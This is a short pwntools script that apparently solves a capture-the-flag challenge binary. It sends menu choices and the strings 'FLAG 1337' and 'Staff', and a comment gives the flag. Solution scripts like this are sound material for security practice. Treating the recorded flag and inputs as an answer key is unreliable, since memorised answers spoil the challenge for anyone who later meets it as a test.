import sys
from pwn import *

# Flag : buckeye{if_0n1y_th15_w0rk3d}

elf = ELF("./chall")
proc = elf.process()

res = proc.recvuntil("\n").decode()
res += proc.recvuntil("\n").decode()
res += proc.recvuntil("\n").decode()
print(res)
proc.sendline("1")
print(proc.recvuntil("\n").decode())
payload = b"FLAG 1337"
proc.sendline(payload)
print(proc.recvuntil("\n").decode())

res = proc.recvuntil("\n").decode()
res += proc.recvuntil("\n").decode()
res += proc.recvuntil("\n").decode()
print(res)
proc.sendline("2")
print(proc.recvuntil("\n").decode())
payload = b"Staff"
proc.sendline(payload)
print(proc.recvuntil("\n").decode())
